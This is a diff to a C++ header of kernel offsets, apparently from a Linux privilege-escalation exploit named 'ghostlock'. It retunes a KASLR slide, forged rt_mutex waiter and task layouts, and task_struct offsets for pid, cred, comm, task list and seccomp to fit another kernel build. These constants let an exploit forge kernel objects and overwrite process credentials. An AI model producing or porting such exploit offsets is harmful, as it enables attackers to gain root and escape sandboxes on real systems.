@@ -124,7 +124,7 @@ namespace ghostlock::kernel {
     inline constexpr unsigned long long SLIDE_SYSCTL_BOOTID_IMAGE =
             KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF;
 
-    inline constexpr int32_t PSELECT_WAITER_WORD_SHIFT = -2;
+    inline constexpr int32_t PSELECT_WAITER_WORD_SHIFT = 0;
 
     /* Fake waiter and task layouts. */
     inline constexpr int32_t FAKE_WAITER_TREE_PRIO_OFF = 0x18;
@@ -132,29 +132,29 @@ namespace ghostlock::kernel {
     inline constexpr int32_t FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x18;
     inline constexpr int32_t FAKE_WAITER_PI_TREE_PRIO_OFF = 0x40;
     inline constexpr int32_t FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0x48;
-    inline constexpr int32_t FAKE_WAITER_TASK_OFF = 0x50;
-    inline constexpr int32_t FAKE_WAITER_LOCK_OFF = 0x58;
+    inline constexpr int32_t FAKE_WAITER_TASK_OFF = 0x30;
+    inline constexpr int32_t FAKE_WAITER_LOCK_OFF = 0x38;
     inline constexpr int32_t FAKE_WAITER_WAKE_STATE_OFF = 0x60;
     inline constexpr int32_t FAKE_WAITER_WW_CTX_OFF = 0x68;
 
     inline constexpr int32_t FAKE_TASK_USAGE_OFF = 0x40;
     inline constexpr int32_t FAKE_TASK_PRIO_OFF = 0x84;
     inline constexpr int32_t FAKE_TASK_NORMAL_PRIO_OFF = 0x8c;
-    inline constexpr int32_t FAKE_TASK_TASK_GROUP_OFF = 0x348;
-    inline constexpr int32_t FAKE_TASK_PI_LOCK_OFF = 0x90c;
-    inline constexpr int32_t FAKE_TASK_PI_WAITERS_OFF = 0x920;
-    inline constexpr int32_t FAKE_TASK_PI_TOP_TASK_OFF = 0x930;
-    inline constexpr int32_t FAKE_TASK_PI_BLOCKED_ON_OFF = 0x938;
+    inline constexpr int32_t FAKE_TASK_TASK_GROUP_OFF = 0x310;
+    inline constexpr int32_t FAKE_TASK_PI_LOCK_OFF = 0x86c;
+    inline constexpr int32_t FAKE_TASK_PI_WAITERS_OFF = 0x880;
+    inline constexpr int32_t FAKE_TASK_PI_TOP_TASK_OFF = 0x890;
+    inline constexpr int32_t FAKE_TASK_PI_BLOCKED_ON_OFF = 0x898;
 
-    inline constexpr int32_t TASK_PID_OFF = 0x618;
-    inline constexpr int32_t TASK_TGID_OFF = 0x61c;
-    inline constexpr int32_t TASK_ATOMIC_FLAGS_OFF = 0x5d8;
-    inline constexpr int32_t TASK_REAL_CRED_OFF = 0x818;
-    inline constexpr int32_t TASK_CRED_OFF = 0x820;
-    inline constexpr int32_t TASK_COMM_OFF = 0x830;
-    inline constexpr int32_t TASK_TASKS_OFF = 0x550;
+    inline constexpr int32_t TASK_PID_OFF = 0x5C8;
+    inline constexpr int32_t TASK_TGID_OFF = 0x5CC;
+    inline constexpr int32_t TASK_ATOMIC_FLAGS_OFF = 0x590;
+    inline constexpr int32_t TASK_REAL_CRED_OFF = 0x778;
+    inline constexpr int32_t TASK_CRED_OFF = 0x780;
+    inline constexpr int32_t TASK_COMM_OFF = 0x790;
+    inline constexpr int32_t TASK_TASKS_OFF = 0x4C8;
     inline constexpr int32_t TASK_THREAD_INFO_FLAGS_OFF = 0x00;
-    inline constexpr int32_t TASK_SECCOMP_OFF = 0x8e8;
+    inline constexpr int32_t TASK_SECCOMP_OFF = 0x848;
 
     inline constexpr int32_t CRED_UID_OFF = 8;
     inline constexpr int32_t CRED_SECUREBITS_OFF = 40;
